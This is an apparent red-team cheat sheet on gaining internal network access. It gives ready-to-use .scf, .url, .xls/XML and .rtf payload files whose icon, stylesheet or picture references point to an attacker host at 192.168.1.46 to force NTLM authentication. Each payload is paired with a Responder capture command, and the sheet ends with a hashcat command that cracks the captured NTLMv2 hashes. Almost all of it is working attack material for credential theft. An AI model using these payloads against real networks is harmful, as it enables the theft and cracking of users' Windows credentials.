# Internal Initial Access

***

## Shell Command Files - SCF

files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer.

#### Payload

nooranet.scf

```cmd
[Shell]
Command=2
IconFile=\\192.168.1.46\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

#### Responder

```bash
responser -I eth0 -v
```

## Execute via URL

#### payload

nss.url

```cmd
[InternetShortcut]
URL=http://nooranetred.com
WorkingDirectory=c:\
IconFile=\\192.168.1.46\nss.icon
IconIndex=1
```

#### Responder

```bash
responser -I eth0 -v
```

## Execute via XLS

#### nooranet.xls

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\192.168.1.46\1.xsl" ?>
```

#### Responder

```bash
responser -I eth0 -v
```

## Rich Text Format - RTF

#### nss.rtf

```rtf
{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://192.168.1.46/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
```

#### Responder

```bash
responser -I eth0 -v
```

### NTLM Crack offline

```bash
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```

# 